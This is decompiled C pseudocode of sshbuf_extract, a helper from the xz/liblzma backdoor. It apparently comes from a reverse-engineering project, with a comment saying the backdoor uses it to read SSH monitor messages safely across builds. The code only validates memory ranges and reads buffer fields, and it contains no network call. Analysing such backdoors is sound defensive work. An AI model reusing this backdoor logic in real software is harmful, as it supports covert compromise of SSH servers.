// /home/kali/xzre-ghidra/xzregh/107950_sshbuf_extract.c
// Function: sshbuf_extract @ 0x107950
// Calling convention: unknown
// Prototype: undefined sshbuf_extract(void)


/*
 * AutoDoc: Validates a runtime sshbuf using offsets recorded in the global context and returns its data pointer and size. The backdoor uses it to access monitor messages safely even when structure layouts shift across builds.
 */
#include "xzre_types.h"


undefined1  [16]
sshbuf_extract(undefined8 *param_1,long param_2,undefined8 *param_3,undefined8 *param_4,
              undefined8 param_5)

{
  undefined1 auVar1 [16];
  int iVar2;
  ulong uVar3;
  ulong uVar4;
  long lVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined1 auVar8 [16];
  
  if (param_2 == 0) {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_3;
    return auVar1 << 0x40;
  }
  if (((param_1 != (undefined8 *)0x0) && (param_3 != (undefined8 *)0x0)) &&
     (param_4 != (undefined8 *)0x0)) {
    if ((char)(*(byte *)(param_2 + 0x57) & *(byte *)(param_2 + 0x56)) < '\0') {
      uVar3 = 0;
      uVar4 = 0;
      lVar5 = 0x48;
    }
    else {
      uVar3 = (ulong)((int)(char)*(byte *)(param_2 + 0x57) << 3);
      uVar4 = (ulong)((int)(char)*(byte *)(param_2 + 0x56) << 3);
      lVar5 = uVar3 + 8;
      if (uVar3 < uVar4) {
        lVar5 = uVar4 + 8;
      }
    }
    iVar2 = is_range_mapped(param_1,lVar5,param_2);
    if (iVar2 != 0) {
      if (*(char *)(param_2 + 0x56) < '\0') {
        uVar7 = *param_1;
      }
      else {
        uVar7 = *(undefined8 *)(uVar4 + (long)param_1);
      }
      *param_3 = uVar7;
      if (*(char *)(param_2 + 0x57) < '\0') {
        uVar6 = param_1[3];
      }
      else {
        uVar6 = *(undefined8 *)((long)param_1 + uVar3);
      }
      *param_4 = uVar6;
      iVar2 = is_range_mapped(uVar7,uVar6,param_2);
      uVar3 = (ulong)(iVar2 != 0);
      goto LAB_00107a07;
    }
  }
  uVar3 = 0;
LAB_00107a07:
  auVar8._8_8_ = param_5;
  auVar8._0_8_ = uVar3;
  return auVar8;
}

